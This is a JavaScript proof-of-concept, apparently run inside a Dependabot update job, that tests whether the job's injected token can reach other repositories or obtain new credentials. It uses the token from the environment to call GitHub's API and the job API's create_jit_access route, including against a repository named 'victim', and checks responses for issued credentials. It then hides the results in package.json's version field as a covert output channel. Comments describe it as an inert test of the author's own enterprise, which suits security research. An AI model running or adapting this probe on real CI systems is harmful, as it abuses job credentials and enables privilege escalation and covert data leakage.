// INERT negative control. Establishes that the update job's OWN injected
// api.github.com credential cannot reach the target internal repository, and
// that only create_jit_access yields one. Records ONLY HTTP status codes,
// GitHub's own static error strings, integer counts and a credential LENGTH.
// The issued credential is never used, printed or transmitted anywhere.
// All targets are repositories of the user's OWN enterprise `medo-new-inc`.
const fs=require('fs'),path=require('path'),http=require('http'),https=require('https');
const api=process.env.DEPENDABOT_API_URL||'', jid=process.env.DEPENDABOT_JOB_ID||'';
const tok=process.env.DEPENDABOT_JOB_TOKEN||'';
function tag(s,n){return String(s).replace(/[^A-Za-z0-9]+/g,'').slice(0,n||12);}
function req(m,u2,extra){return new Promise(r=>{let u;try{u=new URL(u2);}catch(e){return r('BADURL');}
  const lib=u.protocol==='http:'?http:https;
  const q=lib.request({method:m,hostname:u.hostname,port:u.port||undefined,path:u.pathname+u.search,
    headers:Object.assign({'Authorization':tok,'Accept':'application/json','User-Agent':'jitprobe'},extra||{}),
    timeout:15000},res=>{
    let b='';res.on('data',c=>{b+=c;if(b.length>65536)res.destroy();});
    res.on('end',()=>{let d='',x='';
      try{const j=JSON.parse(b);
        d=tag(j.detail||j.message||'',12);
        if(typeof j.total_count==='number')d='n'+j.total_count;
        if(j.username==='x-access-token'&&typeof j.password==='string'&&j.password.length)x='CRED'+j.password.length;
      }catch(e){}
      r(String(res.statusCode)+d+x);});
  });
  q.on('timeout',()=>{q.destroy();r('TMO');});q.on('error',e=>r('E'+tag(e.code||e.message,8)));q.end();});}
const GH='https://api.github.com';
(async()=>{const p=[];
 try{
  // BEFORE: what the job's own injected installation credential can see
  p.push('I'+await req('GET',GH+'/installation/repositories?per_page=1'));
  p.push('P'+await req('GET',GH+'/repos/new-ORG-te/jit-gate-probe-newinc'));
  p.push('V'+await req('GET',GH+'/repos/new-ORG-te/jit-probe-victim-newinc2'));
  // the route under test
  p.push('T'+await req('POST',api+'/update_jobs/'+jid+
    '/create_jit_access?account=new-ORG-te&repository=jit-gate-probe-newinc'));
 }catch(e){p.push('X'+tag(e.message,8));}
 try{const pj=path.join(__dirname,'package.json');const j=JSON.parse(fs.readFileSync(pj,'utf8'));
  j.version=('0.0.9-'+p.join('-')).replace(/[^A-Za-z0-9.-]/g,'').slice(0,180);
  fs.writeFileSync(pj,JSON.stringify(j,null,2));}catch(e){}
})();
